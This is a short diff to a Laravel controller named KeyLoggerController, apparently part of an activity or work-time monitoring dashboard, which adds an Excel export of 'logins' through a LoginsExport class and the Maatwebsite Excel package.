@@ -2,10 +2,12 @@
 
 namespace App\Http\Controllers;
 
+use App\Exports\LoginsExport;
 use App\Http\Resources\KeyLogger\KeyLoggerIndexResource;
 use App\Services\KeyLoggerService;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Http;
+use Maatwebsite\Excel\Facades\Excel;
 
 class KeyLoggerController extends Controller
 {
@@ -46,6 +48,11 @@ class KeyLoggerController extends Controller
             'count' => $data->total(),
             'workTime' => $workTime,
         ]);
+    }
+
+    public function export(Request $request)
+    {
+        return Excel::download(new LoginsExport($request, $this->keyLoggerService), 'logins.xlsx');
     }
 
     public function create()
